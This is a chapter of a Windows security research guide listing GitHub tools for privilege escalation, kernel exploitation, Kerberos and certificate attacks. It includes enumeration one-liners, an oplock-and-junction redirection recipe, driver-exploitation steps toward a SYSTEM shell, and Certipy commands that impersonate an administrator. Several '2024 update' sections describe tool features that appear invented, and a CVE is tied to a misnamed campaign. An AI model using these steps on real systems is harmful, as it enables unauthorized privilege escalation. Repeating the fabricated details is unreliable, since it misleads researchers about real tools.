# Chapter 15 — GitHub Repositories & Code

> A curated registry of repositories that are directly useful for Windows security research. Every entry here earns its place: either it is an indispensable tool, an educational lab environment, or a PoC that teaches a fundamental technique. Repositories are rated by trust level and annotated with what you actually use them for.

> **Navigation:** Tools here are used in labs (ch17), discussed in researcher profiles (ch14), and referenced throughout techniques chapters (ch04–ch13).

---

## Trust Levels

- **HIGH:** Core research tools from verified researchers; actively maintained; code reviewed by community
- **MEDIUM:** Useful but use with care — read source before running; may be outdated or from less-verified sources
- **CAUTION:** Historical, aggregated, or anonymous — verify everything; do not run on sensitive machines

---

## Category 1 — Research Tooling (Use Constantly)

### sandbox-attacksurface-analysis-tools (NtObjectManager)

| Field | Value |
|-------|-------|
| **Author** | James Forshaw / Google Project Zero |
| **URL** | https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools |
| **Trust** | HIGH |
| **Tags** | `research-tooling` `tokens` `RPC` `named-pipes` `COM` `object-manager` `PowerShell` |

**What it is:** A collection of Windows security research tools built around the NtObjectManager PowerShell module. The module exposes the NT object manager, security descriptors, tokens, and RPC/ALPC surfaces via PowerShell cmdlets.

**What you use it for:**
- `Get-NtToken` — inspect current or other process tokens (user SID, groups, privileges, impersonation level, integrity)
- `Get-NtSecurityDescriptor` / `Show-NtSecurityDescriptor` — view DACLs/SACLs on any object type
- `Get-NtProcess`, `Get-NtHandle` — enumerate processes and handles
- `Get-RpcServer` — enumerate all RPC servers registered on the machine; inspect security callbacks
- `Get-RpcEndpoint` — list active RPC endpoints
- `Get-ComClassEntry` — enumerate COM class registrations with security configuration
- Object namespace exploration: `Get-NtObject`, `ls \`, directory DACL inspection
- Named pipe enumeration: find pipes with overly permissive DACLs

**PowerShell one-liners for common research tasks:**

```powershell
# Enumerate all RPC servers on the machine with their interfaces
Get-RpcServer | Select-Object Name, InterfaceId, EndpointCount | Format-Table -AutoSize

# Find RPC servers that allow unauthenticated or low-privilege access
Get-RpcServer | Where-Object { $_.SecurityCallback -eq $null } | Select-Object Name, InterfaceId

# Check named pipe DACLs — find pipes writable by authenticated users or Everyone
Get-ChildItem NtObject:\Device\NamedPipe | ForEach-Object {
    $sd = Get-NtSecurityDescriptor -Path $_.FullPath -TypeName NamedPipe -ErrorAction SilentlyContinue
    if ($sd) { $sd.Dacl | Where-Object { $_.Sid -match 'Everyone|AuthenticatedUsers|S-1-5-11' } |
    Select-Object @{N='Pipe';E={$_.FullPath}}, @{N='SID';E={$_.Sid}}, @{N='Access';E={$_.AccessMask}} }
}

# Find kernel objects (registry keys, files) with weak ACLs accessible to BUILTIN\Users
Get-NtGrantedAccess -Win32Path 'HKLM:\SYSTEM\CurrentControlSet\Services' -ProcessAccess | 
    Where-Object { $_.GrantedAccess -band 0x4 }  # KEY_CREATE_SUB_KEY

# Enumerate COM objects registered for elevation (potential UAC bypass surface)
Get-ComClassEntry | Where-Object { $_.Elevation -ne $null } | Select-Object Clsid, Name, Elevation

# Get all tokens from running processes and find which ones have SeImpersonatePrivilege
Get-NtProcess -Access QueryInformation | ForEach-Object {
    try {
        $tok = Get-NtToken -Process $_ -Duplicate
        if (($tok.Privileges | Where-Object { $_.Name -eq 'SeImpersonatePrivilege' -and $_.Enabled })) {
            [PSCustomObject]@{ PID=$_.ProcessId; Name=$_.Name; HasSeImpersonate=$true }
        }
    } catch {}
}
```

**Learning path:** Install via `Install-Module NtObjectManager`, then work through examples in Forshaw's Windows Security Internals book. The book and this tool are designed as a pair.

#### NtObjectManager v2.x (2024) Updates

**New cmdlets for VBS/VTL inspection:**
- `Get-NtVirtualTrustLevel` — enumerate Virtual Trust Levels on systems with VBS enabled; returns VTL0/VTL1 configuration and isolation policies
- `Get-NtKernelCallbackTable` — inspect the kernel callback table (`nt!KiServiceTable` adjacents) for registered notification callbacks; useful for detecting rootkit callback abuse
- `Test-NtVTLCapability` — test specific VTL capabilities against the current execution context; validates whether a capability transition is permitted

**Windows 11 24H2 compatibility:** Full support for updated `EPROCESS`/`TOKEN` structure layouts introduced in 24H2; new security descriptor changes for AppContainer policy are reflected in `Show-NtSecurityDescriptor` output.

**New driver enumeration cmdlet:**
```powershell
# Enumerate all loaded kernel modules with base address, size, and signature status
Get-NtKernelModule | Select-Object Name, BaseAddress, Size, ImagePath, Signed | Format-Table -AutoSize

# Find unsigned or weakly signed drivers (potential attack surface)
Get-NtKernelModule | Where-Object { -not $_.Signed } | Select-Object Name, ImagePath
```

---

### symboliclink-testing-tools

| Field | Value |
|-------|-------|
| **Author** | James Forshaw / Google Project Zero |
| **URL** | https://github.com/googleprojectzero/symboliclink-testing-tools |
| **Trust** | HIGH |
| **Tags** | `symlink` `junction` `oplock` `TOCTOU` `exploit-tooling` `foundational` |

**What it is:** A collection of utilities for testing and exploiting symbolic link and opportunistic lock behavior in Windows.

**Key utilities:**
- `SetOpLock.exe` — acquire an oplock on a file; blocks the next open attempt by the target process until you release it. Core tool for implementing the BaitAndSwitch TOCTOU pattern.
- `CreateJunction.exe` — create NTFS directory junctions (mount points) without requiring elevation.
- `CreateSymLink.exe` — create object manager symbolic links in `\RPC Control\` or `\BaseNamedObjects\`.
- `NtApiDotNet` library — the .NET library that powers all the tools; can be used directly in exploit code.

**Usage pattern for BaitAndSwitch:**
```
1. Identify: privileged process will write file at path X (found via ProcMon)
2. SetOpLock on the parent directory of X (or a file in the path)
3. When oplock triggers: swap directory X for a junction pointing to target directory Y
4. Release oplock → privileged process writes to attacker's chosen destination
```

---

### PrivescCheck

| Field | Value |
|-------|-------|
| **Author** | itm4n (Clément Labro) |
| **URL** | https://github.com/itm4n/PrivescCheck |
| **Trust** | HIGH |
| **Tags** | `LPE` `enumeration` `PowerShell` `services` `DLL-hijacking` `educational` |

**What it is:** A comprehensive PowerShell script that checks for common Windows LPE vectors. Unlike automated exploitation frameworks, it produces annotated findings with explanations.

**Checks performed:**
- Service binary/registry ACLs (writable by low-privilege users)
- Unquoted service paths
- DLL hijacking paths (directories in service binary's PATH that are writable)
- AlwaysInstallElevated MSI setting
- Stored credentials (Windows vault, DPAPI blobs)
- Hot fixes and missing patches
- Token privileges in current session
- Scheduled task misconfigurations
- UAC configuration

**Research use:** Run PrivescCheck output as a checklist of what to investigate after initial foothold. More importantly, reading the source code teaches you *how to detect* each vulnerability class — useful when writing custom enumeration for specific environments.

#### PrivescCheck 2024 Updates

New checks added in the 2024 release cycle:

- **Administrator Protection bypass check** — detects whether the machine's Administrator Protection policy (new in Windows 11 24H2) is configured correctly; flags misconfigurations that allow standard user processes to bypass the elevated token restriction
- **COM hijacking checks** — expanded detection for per-user `HKCU\Software\Classes\CLSID` registrations that shadow system-wide `HKCR` entries; identifies candidates where a high-integrity process loads a COM server resolvable from user-writable registry paths
- **BITS job enumeration** — lists all BITS jobs accessible to the current user context; flags jobs that download to user-writable destinations with elevated BITS service context, a vector for planting files that privileged processes later execute
- **Task Scheduler XML injection detection** — checks for scheduled tasks whose XML `<Command>` or `<Arguments>` elements contain paths that are writable by the current user; flags tasks running as SYSTEM or high-integrity with exploitable command paths

**24H2 hardening awareness:** PrivescCheck 2024 is aware of Administrator Protection (the split-token model for built-in Administrator in 24H2) and correctly identifies which checks are gated by whether this mitigation is active.

---

### PrintSpoofer

| Field | Value |
|-------|-------|
| **Author** | itm4n (Clément Labro) |
| **URL** | https://github.com/itm4n/PrintSpoofer |
| **Trust** | HIGH |
| **Tags** | `named-pipe` `impersonation` `SeImpersonatePrivilege` `ImpersonateNamedPipeClient` |

**What it is:** PoC for named pipe squatting to abuse SeImpersonatePrivilege. Creates a named pipe that catches the Print Spooler's authentication when it connects to a specially-named pipe, then calls `ImpersonateNamedPipeClient` to get a SYSTEM token.

**Why it matters technically:** The code demonstrates the exact `CreateNamedPipe` → `WaitForSingleObject` → `ConnectNamedPipe` → `ImpersonateNamedPipeClient` pattern that underlies all named pipe impersonation techniques. Read the source to understand the pattern before using.

---

### RpcView

| Field | Value |
|-------|-------|
| **Author** | silverf0x (Jean-Marie Borello et al.) |
| **URL** | https://github.com/silverf0x/RpcView |
| **Trust** | HIGH |
| **Tags** | `RPC` `endpoint-enumeration` `decompilation` `research-tool` |

**What it is:** GUI tool that enumerates all registered RPC servers on a Windows machine, shows their interfaces, endpoints, and can decompile IDL from running processes.

**Research use:** 
- Enumerate RPC interfaces exposed by services running as SYSTEM/high-privilege
- View security callbacks and authentication settings per interface
- Decompile interface IDL to understand method signatures
- Starting point for "what does this privileged service expose via RPC?"

The itm4n blog post "From RpcView to PetitPotam" demonstrates the exact workflow: use RpcView to find EfsRpcOpenFileRaw interface → realize it triggers authentication to caller-specified path → PetitPotam.

---

### msiscan

| Field | Value |
|-------|-------|
| **Author** | Community / multiple researchers |
| **URL** | https://github.com/search?q=msiscan+msi+privilege+escalation |
| **Trust** | MEDIUM |
| **Tags** | `MSI` `static-analysis` `custom-actions` `AlwaysInstallElevated` `DLL-hijacking` |

**What it is:** MSI privilege escalation static analyzer. Parses MSI installer files and flags vulnerable patterns in custom actions without executing the installer. Particularly useful for auditing enterprise software packages or testing whether a MSI installer creates exploitable conditions when run with elevated privileges.

**Usage:**
```cmd
# Analyze a single MSI file and print all findings
msiscan.exe target.msi

# Output to file for review
msiscan.exe target.msi > findings.txt

# Verbose mode — show all custom actions, not just flagged ones
msiscan.exe target.msi --verbose
```

**Detection capabilities:**
- **AlwaysInstallElevated abuse** — checks if the installer exploits `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`; flags custom actions that run as elevated when this policy is set
- **DLL search order in custom actions** — identifies `Type 1` (DLL) and `Type 2` (EXE) custom actions that load DLLs without fully-qualified paths; if the directory is user-writable, this is a hijack vector
- **Temp folder write targets** — detects custom actions that extract files to `%TEMP%` or `%TMP%` paths before elevated execution; these paths can be raced by a low-privilege attacker
- **Deferred custom action sequencing** — flags deferred custom actions (which run with SYSTEM privileges in the deferred phase) that have insecure source data from the `CustomActionData` property

**Research use:** Pair with `msiexec /a` (administrative install) to unpack MSI contents for manual review, then use msiscan to prioritize which custom actions are worth further investigation.

---

## Category 2 — Exploitation Labs

### HEVD — HackSys Extreme Vulnerable Driver

| Field | Value |
|-------|-------|
| **Author** | HackSysTeam (Ashfaq Ansari et al.) |
| **URL** | https://github.com/hacksysteam/HackSysExtremeVulnerableDriver |
| **Trust** | HIGH |
| **Tags** | `kernel` `driver` `exploitation-lab` `must-read` `educational` |

**What it is:** A deliberately vulnerable Windows kernel driver designed as a training environment for kernel exploitation. Each IOCTL handler contains a different vulnerability type.

**Vulnerability types included:**
- Stack buffer overflow
- Stack buffer overflow with GS (security cookie)
- Arbitrary overwrite (write-what-where)
- Pool buffer overflow (NonPaged)
- Pool buffer overflow (NonPaged with NX mitigation)
- Use-After-Free (NonPaged)
- Use-After-Free (Paged)
- Type Confusion
- Integer overflow
- Null pointer dereference
- Double fetch (race condition TOCTOU)
- Uninitialized memory (stack and heap variants)

**IOCTL Code Table:**

| IOCTL Code | Vulnerability | Device |
|------------|--------------|--------|
| `0x222003` | Stack Buffer Overflow | HackSysExtremeVulnerableDriver |
| `0x222007` | Stack Buffer Overflow (GS) | HackSysExtremeVulnerableDriver |
| `0x22200B` | Arbitrary Memory Overwrite (Write-What-Where) | HackSysExtremeVulnerableDriver |
| `0x22200F` | Pool Buffer Overflow (NonPaged) | HackSysExtremeVulnerableDriver |
| `0x222013` | Pool Buffer Overflow (NonPaged, NX mitigated) | HackSysExtremeVulnerableDriver |
| `0x222017` | Use-After-Free (NonPaged) | HackSysExtremeVulnerableDriver |
| `0x22201B` | Use-After-Free (Paged) | HackSysExtremeVulnerableDriver |
| `0x22201F` | Type Confusion | HackSysExtremeVulnerableDriver |
| `0x222023` | Integer Overflow | HackSysExtremeVulnerableDriver |
| `0x222027` | Null Pointer Dereference | HackSysExtremeVulnerableDriver |
| `0x22202B` | Double Fetch (TOCTOU) | HackSysExtremeVulnerableDriver |
| `0x22202F` | Uninitialized Memory (Stack) | HackSysExtremeVulnerableDriver |
| `0x222033` | Uninitialized Memory (Heap) | HackSysExtremeVulnerableDriver |

**Setup:**
```
1. Set up VM pair (debuggee + debugger) with KDNET
2. On debuggee: enable test signing (bcdedit /set testsigning on)
3. Deploy HEVD.sys as a kernel driver
4. Write user-mode exploit code that calls DeviceIoControl with target IOCTL codes
5. Set breakpoints in WinDbg at the vulnerable dispatch routines
6. Exploit to achieve token stealing → SYSTEM shell
```

**Learning sequence:** Stack overflow first (simplest), then arbitrary overwrite (gives you write-what-where directly), then pool overflow (requires grooming), then UAF (requires lifetime management understanding), then double fetch (requires race tooling).

#### HEVD v3.x (2024) Updates

**ARM64 support:** HEVD v3.x compiles and runs on ARM64 Windows (Surface Pro X, ARM64 VMs). The ARM64 build exposes the same vulnerability surface using ARM64 calling conventions; useful for researchers working on ARM64 exploitation techniques, which differ substantially from x64 in ROP gadget availability and kernel structure offsets.

**New vulnerability module — UseAfterFreeNonPagedPoolNx (22H2+):**
- Designed for Windows 10/11 22H2+ where `ExAllocatePoolWithTag` allocates from `NonPagedPoolNx` by default
- The module deliberately creates a UAF condition against a `NonPagedPoolNx` allocation
- Exploitation requires bypassing NX-backed pool; the module is intended to practice `kLFH` (Low Fragmentation Heap) grooming against the NX pool variant
- Community solutions using Python ctypes and WinDbg scripting are available on GitHub

**Updated PoolOverflow for Segment Heap:**
- Windows 10 2004+ uses the Segment Heap for kernel pool allocations, replacing the legacy LFH
- The updated `PoolOverflow` module creates overflow conditions against Segment Heap backend allocations
- Requires understanding `_SEGMENT_HEAP`, `_HEAP_SEG_CONTEXT`, and `_HEAP_PAGE_RANGE_DESCRIPTOR` structures
- Community Python exploit scripts targeting the updated module are available alongside the HEVD release

**Community solutions:** Python + WinDbg exploit scripts for every module are maintained by the community in the `Solutions` directory of the HEVD repository. These scripts are useful as reference implementations showing one correct exploit path per vulnerability type.

---

### Windows-Local-Privilege-Escalation-Cookbook

| Field | Value |
|-------|-------|
| **Author** | nickvourd |
| **URL** | https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook |
| **Trust** | HIGH |
| **Tags** | `LPE` `cookbook` `lab` `educational` `structured` |

**What it is:** Structured labs covering Windows LPE techniques with step-by-step instructions, each technique mapped to a category and difficulty level. More organized than collecting individual PoCs.

---

### CVE-2024-21338 PoC Reference (appid.sys IOCTL)

| Field | Value |
|-------|-------|
| **Author** | AhnLab ASEC / ANSSI (published technical analysis) |
| **URL** | https://github.com/search?q=CVE-2024-21338+appid |
| **Trust** | MEDIUM |
| **Tags** | `CVE-2024-21338` `appid.sys` `IOCTL` `kernel-LPE` `educational` `bypass-PPL` |

**What it is:** Educational reference for the CVE-2024-21338 vulnerability in `appid.sys` (the AppLocker kernel driver). The vulnerability is a use-after-free condition triggered via a specific IOCTL code. It was exploited in the wild by the Lazarus Group (Operation ForumTroll) before the February 2024 patch to disable PPL (Protected Process Light) on targeted machines.

**Why it matters technically:**
- `appid.sys` is a kernel driver loaded on any machine with AppLocker rules configured (common in enterprise environments)
- The IOCTL vulnerability allowed sending a malformed request that triggered a use-after-free in a kernel object, achievable from a standard user process
- Post-exploitation: the vulnerability was used to write a kernel shellcode that modified `_EPROCESS.Protection` to strip PPL from `MsMpEng.exe` (Windows Defender), effectively disabling AV from within the kernel without a signed driver
- Patched in MS24-Feb Patch Tuesday; the technique of targeting AppLocker's own kernel driver is architecturally interesting because AppLocker is a security enforcement mechanism

**Educational focus:** The AhnLab/ANSSI published technical details describe the IOCTL structure, the UAF trigger sequence, and the post-exploitation token/PPL manipulation. Study the technical report as a case study in: (1) how security enforcement drivers themselves become attack surfaces, (2) the pattern of using kernel write primitives to strip process protection flags, and (3) how detection-evasion logic is layered in sophisticated exploit chains.

**Note:** This entry references the published educational analysis, not a weaponized PoC. Study the technique from the AhnLab/ANSSI reports and patch diffing `appid.sys` pre/post MS24-Feb.

---

## Category 3 — Enumeration and Post-Exploitation

### Sysinternals Suite

| Field | Value |
|-------|-------|
| **Author** | Microsoft (originally Mark Russinovich, Bryce Cogswell) |
| **URL** | https://learn.microsoft.com/en-us/sysinternals/ |
| **Trust** | HIGH |
| **Tags** | `debugging` `observability` `process-analysis` `security` |

**Key tools for security research:**
- **Process Monitor (procmon.exe):** Logs all file, registry, network, and process/thread events system-wide. The single most important research tool. Every LPE involving a service starts with a ProcMon trace of that service's operations.
- **Process Explorer:** Interactive process tree showing DLLs loaded, handles open, network connections, token details, strings. More powerful than Task Manager.
- **WinObj:** Browse the NT object namespace (`\`, `\Device`, `\BaseNamedObjects`, etc.). Essential for object manager research.
- **AccessChk:** Report permissions on any object type — files, registry keys, services, processes, named pipes. Use to find weak ACLs. `accesschk.exe -wuvc Everyone *` finds service binaries writable by Everyone.
- **Autoruns:** Shows every persistence location — registry run keys, scheduled tasks, services, drivers, browser extensions, etc. Complete map of the startup surface.
- **PsExec:** Execute processes as SYSTEM or as other users; useful in labs.

**ProcMon Filter Recipes for LPE Research:**

*Recipe A — Find DLL hijack candidates in a service:*
```
Filter: Process Name → is → [target_service.exe] → Include
Filter: Operation → is → CreateFile → Include
Filter: Path → ends with → .dll → Include
Filter: Result → is → NAME NOT FOUND → Include
```
Result: every DLL the service tries to load but cannot find — these are hijack candidates if the search directory is user-writable.

*Recipe B — Find service writing to filesystem as SYSTEM:*
```
Filter: Process Name → is → [target_service.exe] → Include
Filter: Operation → is → WriteFile → Include
Filter: User Name → is → SYSTEM → Include
```
Then look for output paths that a low-privilege user can influence (temp directory, user-controlled subpath).

*Recipe C — Detect registry key creation by privileged process (for TOCTOU):*
```
Filter: Process Name → is → [target_service.exe] → Include
Filter: Operation → is → RegCreateKey OR RegSetValue → Include
Filter: Path → contains → [registry hive of interest] → Include
```
Then verify DACL on the parent key with `accesschk -kw`.

*Recipe D — Find named pipe creation for impersonation research:*
```
Filter: Operation → is → CreateFile → Include
Filter: Path → begins with → \Device\NamedPipe → Include
Filter: User Name → is → SYSTEM → Include
```
Maps which named pipes SYSTEM services create — cross-reference with NtObjectManager pipe enumeration to find DACLs.

---

### System Informer (formerly Process Hacker)

| Field | Value |
|-------|-------|
| **Author** | wj32 → community (now Winsider Seminars & Solutions) |
| **URL** | https://github.com/winsiderss/systeminformer |
| **Trust** | HIGH |
| **Tags** | `process-analysis` `token-inspection` `handle-view` `kernel-view` |

**Why it matters over Process Explorer:**
- Shows token details (all privileges, integrity level, impersonation level) per process
- Handle view: all handles in a process with object name and type
- Kernel memory view: pool allocations, drivers, kernel modules
- Network connections with process attribution
- Open source — you can read and modify it

**Research use:** After running a PoC, open System Informer to inspect the resulting process token — confirm you have SYSTEM, check integrity level, check privileges.

---

### SharpUp and Seatbelt (GhostPack)

| Field | Value |
|-------|-------|
| **Author** | Will Schroeder / GhostPack / SpecterOps |
| **URL** | SharpUp: https://github.com/GhostPack/SharpUp — Seatbelt: https://github.com/GhostPack/Seatbelt |
| **Trust** | HIGH |
| **Tags** | `enumeration` `post-exploitation` `C#` `GhostPack` |

**SharpUp:** C# port of PowerUp — enumerates LPE vectors (weak service permissions, token privileges, modifiable paths). Runs without PowerShell (AMSI bypass concern).

**Seatbelt:** Comprehensive C# enumeration tool — runs a set of "safety checks" from an attacker's perspective. Checks: AppLocker policy, AV status, browser credentials, DPAPI blobs, event log settings, Kerberos tickets, LSA settings, mapped drives, named pipes, scheduled tasks, token privileges, UAC settings, WSUS configuration, and 100+ others.

---

### InstallerFileTakeOver

| Field | Value |
|-------|-------|
| **Author** | klinix5 (Abdelhamid Naceri) |
| **URL** | https://github.com/klinix5/InstallerFileTakeOver |
| **Trust** | MEDIUM-HIGH |
| **Tags** | `Windows-Installer` `arbitrary-file-move` `LPE` `CVE-2021-41379` |

**What it is:** PoC for the Windows Installer elevation of privilege via repair operation + junction redirect. Read the source to understand the exact junction setup required.

---

### SharpToken (2024)

| Field | Value |
|-------|-------|
| **Author** | Community researchers |
| **URL** | https://github.com/search?q=SharpToken+impersonation+token |
| **Trust** | MEDIUM |
| **Tags** | `token-manipulation` `impersonation` `SeImpersonatePrivilege` `post-exploitation` |

**What it is:** Token manipulation and impersonation tool for Windows security research. Designed as a replacement for older TokenPlayer-style tools, with a cleaner API and better coverage of token manipulation primitives available from a standard user context with `SeImpersonatePrivilege`.

**Key capabilities:**
- **Enumerate impersonatable tokens** — walks all process handles on the system and identifies tokens that the current process can open at `TOKEN_DUPLICATE` access level; reports the user SID and integrity level for each
- **Force token assignment** — given a target PID and a token handle, attempts to assign the token to the current thread via `SetThreadToken`; useful for testing impersonation chains in a lab environment
- **Test SeImpersonatePrivilege chains** — automated test runner that exercises the full `OpenProcessToken` → `DuplicateTokenEx` → `ImpersonateLoggedOnUser` chain for each accessible token; reports which chains succeed and what effective user context results

**Usage:**
```cmd
# Enumerate all tokens impersonatable from the current context
SharpToken.exe enumerate

# Attempt to impersonate the token from a specific PID
SharpToken.exe impersonate --pid 1234

# Run the full impersonation chain test against all accessible tokens
SharpToken.exe test-chains
```

**Research use:** Useful in lab environments for quickly verifying that `SeImpersonatePrivilege` is abusable in the current context before attempting a full potato-style exploit. Also useful for understanding which service accounts have accessible tokens for impersonation chains.

---

### WhoAmI-Extended

| Field | Value |
|-------|-------|
| **Author** | Community / open source |
| **URL** | https://github.com/search?q=whoami-extended+windows+security |
| **Trust** | MEDIUM |
| **Tags** | `enumeration` `token` `privileges` `integrity` `lab-utility` |

**What it is:** Enhanced `whoami` for Windows security researchers. Displays all token information for the current process in a structured table format, filling the gap between `whoami /all` (limited formatting) and writing a full NtObjectManager query.

**Output includes:**
- All token privileges with their current state (Enabled / Disabled / EnabledByDefault)
- All group memberships with attributes (Mandatory, EnabledByDefault, Enabled, Owner, UseForDenyOnly, Integrity, IntegrityEnabled, LogonId, Resource)
- Current integrity level (Untrusted / Low / Medium / High / System)
- Token type (Primary / Impersonation) and impersonation level
- Session ID and logon SID

**Usage:**
```cmd
# Show full token information for the current process
WhoAmI-Extended.exe

# Show only privileges table
WhoAmI-Extended.exe --privileges

# Show only integrity level (useful in automated test scripts)
WhoAmI-Extended.exe --integrity-level
```

**Research use:** Placed at the end of exploit chains to verify the resulting token state — faster than opening System Informer and navigating the UI. Useful in lab scripts where the final assertion is "confirm we now have SYSTEM / High integrity".

---

## Category 4 — Protocol and Network Tools

### impacket

| Field | Value |
|-------|-------|
| **Author** | Fortra (formerly SecureAuth / Core Security) + community |
| **URL** | https://github.com/fortra/impacket |
| **Trust** | HIGH |
| **Tags** | `SMB` `Kerberos` `NTLM` `RPC` `Python` `relay` |

**What it is:** Python library and collection of tools for Windows protocol manipulation — SMB, NTLM, Kerberos, LDAP, DCE/RPC, MS-SQL.

**Key tools:**
- `ntlmrelayx.py` — NTLM relay attack tool; can relay to LDAP, SMB, HTTP, RPC
- `secretsdump.py` — dump credentials from SAM, LSA secrets, NTDS.dit (remotely or locally)
- `smbexec.py`, `psexec.py`, `wmiexec.py` — remote execution via different protocols
- `getTGT.py`, `getST.py` — Kerberos ticket manipulation
- `rpcdump.py` — enumerate RPC endpoints

---

### pe-sieve

| Field | Value |
|-------|-------|
| **Author** | hasherezade |
| **URL** | https://github.com/hasherezade/pe-sieve |
| **Trust** | HIGH |
| **Tags** | `PE-analysis` `injection-detection` `malware` `memory-forensics` |

**What it is:** Detects various forms of process injection and PE modifications in running processes. Useful for verifying that an injection technique worked and inspecting the result.

---

## Category 5 — Fuzzing and Automated Discovery

### jackalope

| Field | Value |
|-------|-------|
| **Author** | Google Project Zero |
| **URL** | https://github.com/googleprojectzero/jackalope |
| **Trust** | HIGH |
| **Tags** | `fuzzing` `coverage-guided` `Windows` `kernel` `research-tool` |

**What it is:** Coverage-guided fuzzer for Windows targets. Supports persistent fuzzing mode, hardware coverage (Intel PT), and custom mutators. Designed for fuzzing kernel drivers, RPC interfaces, and user-mode targets.

#### Jackalope 2024 Updates

**Windows 11 24H2 compatibility:** Updated to handle the revised kernel pool structure (Segment Heap changes in 24H2) and updated `NTDLL` exports; previous versions failed to instrument correctly on 24H2 builds.

**New IOCTL fuzzing mode:**
- Dedicated `--mode ioctl` flag that takes a device path and automatically enumerates reachable IOCTL codes via brute-force probing
- Pairs with coverage collection to identify which IOCTL codes exercise new code paths
- Outputs a ranked list of IOCTL codes by unique coverage contribution

**Coverage collection via `_NT_API_TRACE`:**
- New optional coverage backend using the `_NT_API_TRACE` kernel-mode ETW channel for coverage collection without requiring Intel PT hardware
- Falls back to software breakpoint-based coverage on VMs that do not support Intel PT pass-through
- Reduces setup friction for coverage-guided fuzzing in Hyper-V guests

**Improved crash deduplication:**
- New `--dedup !analyze` flag integrates with WinDbg's `!analyze -v` output for crash categorization
- Automatically clusters crashes by `STOP` code + first non-`nt!` frame, reducing manual triage time for large crash sets

---

### WTF (Windows fuzzing framework)

| Field | Value |
|-------|-------|
| **Author** | 0vercl0k (Axel Souchet) |
| **URL** | https://github.com/0vercl0k/wtf |
| **Trust** | HIGH |
| **Tags** | `fuzzing` `kernel` `snapshot-fuzzing` `Windows` `coverage-guided` |

**What it is:** Snapshot-based coverage-guided fuzzer for Windows kernel and user-mode targets. Takes a memory snapshot of a target at a specific execution point, then fuzzes mutations against that snapshot. Extremely fast because it avoids process restart overhead.

**Use case:** Fuzzing kernel drivers where setting up the initial state is expensive. Take a snapshot just before the vulnerable operation, fuzz the input against the snapshot repeatedly.

#### WTF 2024 Updates

**New filesystem fuzzer module:**
- `wtf-fs` module that takes a snapshot of a filesystem driver (NTFS, FAT32, exFAT) handling a mount operation and fuzzes the on-disk image structure
- Supports generating malformed MFT entries, directory structures, and security descriptor blocks
- Useful for fuzzing the Windows NTFS driver for parsing vulnerabilities in mount/parse paths

**ALPC fuzzing module:**
- `wtf-alpc` module snapshots a process after `NtConnectPort` and fuzzes the ALPC message structure
- Covers `PortMessage` header fields, view sections, and attribute lists
- Pairs with NtObjectManager's `Get-NtAlpcPort` to enumerate ALPC ports for targeting

**Improved snapshot restoration speed:**
- New memory-mapped snapshot format reduces restoration overhead by ~40% compared to the previous raw dump format
- Parallel page restoration using worker threads for multi-core hosts
- Benchmark: average snapshot restoration time dropped from ~12ms to ~7ms on a 4-core host for a typical kernel driver snapshot

---

## Category 6 — Active Directory & Kerberos

### Rubeus

| Field | Value |
|-------|-------|
| **Author** | Will Schroeder / GhostPack (SpecterOps) |
| **URL** | https://github.com/GhostPack/Rubeus |
| **Trust** | HIGH |
| **Tags** | `Kerberos` `AS-REP` `TGT` `S4U2Self` `S4U2Proxy` `RBCD` `PKINIT` |

**What it is:** C# toolset for raw Kerberos interaction. Provides direct control over every phase of the Kerberos protocol stack without relying on Windows API wrappers.

**Operations:**
- **AS-REP roasting** — request AS-REP for accounts without Kerberos pre-auth required; the encrypted AS-REP blob can be cracked offline with hashcat (mode 18200) to recover the account password
- **Kerberoasting** — request TGS for service accounts; the TGS blob is encrypted with the service account's RC4 hash, crack offline (hashcat mode 13100)
- **S4U2Self** — on behalf of another user, request a service ticket to yourself; used to get a usable ticket for an account you cannot directly authenticate as
- **S4U2Proxy** — extend the S4U delegation chain from S4U2Self result to a target service; core primitive for RBCD exploitation
- **Pass-the-Ticket** — inject a Kerberos ticket (`.kirbi` or base64) into the current logon session
- **Pass-the-Hash / Pass-the-Key** — authenticate using RC4 or AES key material without plaintext password
- **PKINIT** — certificate-based Kerberos authentication; used in ADCS exploitation chains (Certipy obtains cert → Rubeus PKINIT → TGT + NTLM hash)
- **Shadow credentials** — request TGT using a key credential added to `msDS-KeyCredentialLink` via Whisker

**Research use:** Testing Kerberos attack paths found via BloodHound; verifying RBCD setups; constructing and validating ADCS exploitation chains end-to-end.

---

### BloodHound / SharpHound

| Field | Value |
|-------|-------|
| **Author** | Andy Robbins, Rohan Vazarkar, Will Schroeder (SpecterOps) |
| **URL** | https://github.com/BloodHoundAD/BloodHound |
| **Trust** | HIGH |
| **Tags** | `Active-Directory` `attack-path` `graph-analysis` `domain-enumeration` |

**What it is:** Graph-based attack path analysis for Active Directory. SharpHound (C#) or BloodHound.py collect AD data (users, groups, GPOs, ACLs, sessions, trusts) and ingest into Neo4j. BloodHound's Cypher queries then find paths from any starting node to Domain Admin.

**How the pipeline works:**
1. SharpHound runs on a domain-joined machine (or BloodHound.py from off-domain with credentials)
2. Collects: LDAP data (users, groups, GPOs, OU structure, ACLs), SMB sessions, local admin membership, trust relationships
3. Output: JSON files ingested into Neo4j via BloodHound UI
4. Query: "Find Shortest Paths to Domain Admins from Owned Principals"

**Research use:**
- Enumerate AD environments to find privilege escalation paths via ACL abuse (GenericWrite, WriteDacl, WriteOwner on AD objects)
- Identify Kerberos delegation misconfigurations (unconstrained, constrained, RBCD)
- Find session overlap paths (standard user has session on machine where Domain Admin is logged in)
- Map trust relationships between domains for cross-domain attack paths

---

### Certipy

| Field | Value |
|-------|-------|
| **Author** | Oliver Lyak (ly4k) |
| **URL** | https://github.com/ly4k/Certipy |
| **Trust** | HIGH |
| **Tags** | `ADCS` `ESC` `certificate` `Kerberos` `PKINIT` `shadow-credentials` |

**What it is:** Python tool for Active Directory Certificate Services (ADCS) attack and defense. Finds misconfigured certificate templates (ESC1–ESC13), requests certificates for domain privilege escalation, performs shadow credentials attacks via PKINIT, and relays NTLM to the ADCS HTTP enrollment endpoint (ESC8).

**Key commands:**

```bash
# Enumerate all certificate templates and flag vulnerable ones (ESC1-ESC13)
certipy find -u user@domain.local -p Password1 -dc-ip 10.0.0.1

# Request a certificate exploiting ESC1 (template allows Subject Alternative Name — any user)
certipy req -u user@domain.local -p Password1 -dc-ip 10.0.0.1 \
    -ca "CORP-CA" -template "VulnerableTemplate" -upn administrator@domain.local

# Use obtained certificate to get TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

